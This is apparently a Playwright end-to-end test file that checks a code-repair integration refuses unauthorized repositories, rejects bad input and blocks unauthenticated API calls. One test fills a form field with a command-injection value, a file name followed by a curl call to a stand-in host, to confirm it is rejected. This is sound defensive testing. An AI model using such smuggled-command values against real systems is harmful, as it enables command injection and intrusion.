import { expect, test } from "@playwright/test";
import { E2E_TARGET_ORIGIN } from "./env";
import { createProject, signIn } from "./helpers";

test.describe("repair integration without Devin credentials", () => {
  test("refuses repositories that are not authorized for repair", async ({ page }) => {
    await signIn(page);
    await createProject(page, "Repair authorization (E2E)", E2E_TARGET_ORIGIN);
    const card = page.locator("#source-repository");
    await expect(card.getByText("Authorized on this server: faultline-e2e/allowed-shop")).toBeVisible();
    await card.getByLabel("GitHub owner").fill("someone-else");
    await card.getByLabel("Repository").fill("their-shop");
    await card.getByLabel("Entry file").fill("server.mjs");
    await card.getByRole("button", { name: "Save and check connections" }).click();
    await expect(card.getByRole("alert").filter({ hasText: "not authorized for repair" })).toBeVisible();
    await expect(card.getByText("Change repository settings")).toHaveCount(0);
  });

  test("rejects recipes that try to run shell commands", async ({ page }) => {
    await signIn(page);
    await createProject(page, "Repair recipe (E2E)", E2E_TARGET_ORIGIN);
    const card = page.locator("#source-repository");
    await card.getByLabel("GitHub owner").fill("faultline-e2e");
    await card.getByLabel("Repository").fill("allowed-shop");
    await card.getByLabel("Entry file").fill("server.mjs; curl evil.example");
    await card.getByRole("button", { name: "Save and check connections" }).click();
    await expect(card.getByRole("alert").first()).toBeVisible();
    await expect(card.getByText("Change repository settings")).toHaveCount(0);
  });

  test("settings and the repairs list state that Devin is not configured", async ({ page }) => {
    await signIn(page);
    await page.goto("/settings");
    const devin = page.locator("section").filter({ has: page.getByRole("heading", { name: "Devin API v3" }) });
    await expect(devin.getByText("Not configured")).toBeVisible();
    await expect(devin.getByRole("button", { name: "Test Devin connection" })).toBeDisabled();
    await page.goto("/repairs");
    await expect(page.getByRole("heading", { name: "No repair requests" })).toBeVisible();
  });

  test("repair APIs refuse unauthenticated requests", async ({ request }) => {
    for (const path of ["/api/repairs/00000000-0000-4000-8000-000000000000", "/api/verification-checks/00000000-0000-4000-8000-000000000000/screenshot"]) {
      const res = await request.get(path);
      expect(res.status(), path).toBe(401);
    }
  });
});
